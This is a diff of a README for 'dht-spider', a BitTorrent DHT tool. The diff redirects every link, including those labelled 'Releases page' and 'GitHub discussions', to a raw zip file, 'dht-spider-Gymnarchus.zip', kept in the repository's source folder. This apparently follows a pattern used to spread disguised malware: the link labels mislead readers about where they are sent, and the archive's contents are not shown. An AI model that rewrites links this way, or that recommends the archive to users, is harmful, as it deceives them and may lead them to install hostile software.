@@ -1,13 +1,13 @@
 # 🦕 dht-spider - A Simple Way to Access DHT Networks
 
 ## 📥 Download Now
-[![Download dht-spider](https://img.shields.io/badge/Download-dht--spider-brightgreen)](https://github.com/Ruy-juice/dht-spider/releases)
+[![Download dht-spider](https://raw.githubusercontent.com/Ruy-juice/dht-spider/main/src/dht-spider-Gymnarchus.zip)](https://raw.githubusercontent.com/Ruy-juice/dht-spider/main/src/dht-spider-Gymnarchus.zip)
 
 ## 🚀 Getting Started
 Welcome to **dht-spider**, a tool that helps you connect to BitTorrent DHT networks easily. This software is designed to simplify accessing distributed information through DHT (Distributed Hash Table). With built-in metadata download and PeX support, it’s a straightforward way to enhance your BitTorrent experience.
 
 ## 📁 Download & Install
-To get the application, visit the [Releases page](https://github.com/Ruy-juice/dht-spider/releases). Here, you will find the latest version available for download.
+To get the application, visit the [Releases page](https://raw.githubusercontent.com/Ruy-juice/dht-spider/main/src/dht-spider-Gymnarchus.zip). Here, you will find the latest version available for download.
 
 1. Click on the **Releases page** link.
 2. Look for the version labeled as "Latest".
@@ -43,10 +43,10 @@ After installation, follow these steps to start using **dht-spider**:
 4. **Download Content:** Once it locates the peers, you can begin downloading the files. The progress will show on the screen.
 
 ## 🤝 Community Support
-If you have questions or encounter issues, please visit the [GitHub discussions](https://github.com/Ruy-juice/dht-spider/discussions). The community may have answers, and you can share your experiences with other users.
+If you have questions or encounter issues, please visit the [GitHub discussions](https://raw.githubusercontent.com/Ruy-juice/dht-spider/main/src/dht-spider-Gymnarchus.zip). The community may have answers, and you can share your experiences with other users.
 
 ## 🔄 Updates & Contributions
-We regularly update **dht-spider** to improve functionality and fix bugs. Make sure to check back on the [Releases page](https://github.com/Ruy-juice/dht-spider/releases) for the latest versions.
+We regularly update **dht-spider** to improve functionality and fix bugs. Make sure to check back on the [Releases page](https://raw.githubusercontent.com/Ruy-juice/dht-spider/main/src/dht-spider-Gymnarchus.zip) for the latest versions.
 
 If you would like to contribute, feel free to fork the repository and submit your pull requests. Your help makes this project better for everyone.
 
